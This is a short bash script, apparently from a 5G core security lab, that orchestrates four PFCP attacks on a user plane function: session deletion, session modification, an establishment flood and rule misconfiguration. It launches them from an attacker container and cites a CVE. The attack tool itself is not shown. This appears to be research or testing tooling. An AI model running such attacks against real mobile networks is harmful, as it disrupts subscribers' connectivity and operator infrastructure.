#!/usr/bin/env bash
# Tier 2 — Serangan PFCP (N4) dari attacker ke UPF. Amponis et al. 2022; CVE-2024-51179.
# Tier≥2 → run_scenario.sh minta --i-understand-lab-only + banner.
#   bash scenarios/tier2_pfcp/run_tier2.sh [all|T2-01..T2-04]
set -euo pipefail
cd "$(dirname "$0")/../.."
RS="scripts/run_scenario.sh"
UPF_N4="172.23.0.30"; SRC="172.23.0.50"; OK="--i-understand-lab-only"
T="docker exec attacker python3 /opt/attacker/tools/pfcp_attack.py"

docker compose up -d attacker >/dev/null 2>&1 || docker start attacker >/dev/null 2>&1 || true
sleep 3

run_T2_01() { bash "$RS" 2 T2-01 pfcp_session_delete "$SRC" "$UPF_N4" N4 20 $OK -- $T delete      "$UPF_N4" 15 300; }
run_T2_02() { bash "$RS" 2 T2-02 pfcp_session_modify "$SRC" "$UPF_N4" N4 20 $OK -- $T modify      "$UPF_N4" 15 300; }
run_T2_03() { bash "$RS" 2 T2-03 pfcp_estab_flood    "$SRC" "$UPF_N4" N4 20 $OK -- $T estab_flood "$UPF_N4" 15 600; }
run_T2_04() { bash "$RS" 2 T2-04 pfcp_rule_misconfig "$SRC" "$UPF_N4" N4 20 $OK -- $T misconfig   "$UPF_N4" 15 300; }

WHICH="${1:-all}"; sl() { echo; sleep 3; }
if [[ "$WHICH" == all ]]; then run_T2_01; sl; run_T2_02; sl; run_T2_03; sl; run_T2_04
else "run_${WHICH//-/_}"; fi
echo "== Tier 2 selesai =="
